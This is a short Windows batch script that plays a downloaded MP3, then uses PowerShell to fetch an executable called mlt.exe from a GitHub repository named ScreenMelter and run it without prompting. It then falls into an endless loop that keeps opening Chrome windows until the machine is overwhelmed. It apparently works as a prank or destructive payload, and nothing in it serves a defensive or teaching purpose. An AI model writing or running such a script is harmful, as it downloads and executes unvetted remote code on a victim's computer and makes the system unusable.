@echo off

:: Download the MP3 file from GitHub
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/HazeeOnYT/theaudio/raw/ef2e92a4c52d2bcdafaf4d742a4b85d8778db225/salinewin9.mp3' -OutFile 'salinewin9.mp3'"

:: Play the downloaded MP3 file
start "" "salinewin9.mp3"

:: Download mlt.exe from GitHub
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/pankoza2-pl/ScreenMelter/raw/057d99f208a656df41d8cb9b56a1fd2ab561bdd8/mlt.exe' -OutFile 'mlt.exe'"

:: Run mlt.exe
start "" "mlt.exe"

:loop
start chrome https://google.com
start chrome https://google.com
start chrome https://google.com
start chrome https://google.com
start chrome https://google.com
start chrome https://google.com
start chrome https://google.com
start chrome https://google.com
start chrome https://google.com
start chrome https://google.com
start chrome https://google.com
start chrome https://google.com
start chrome https://google.com
start chrome https://google.com
start chrome https://google.com
goto :loop
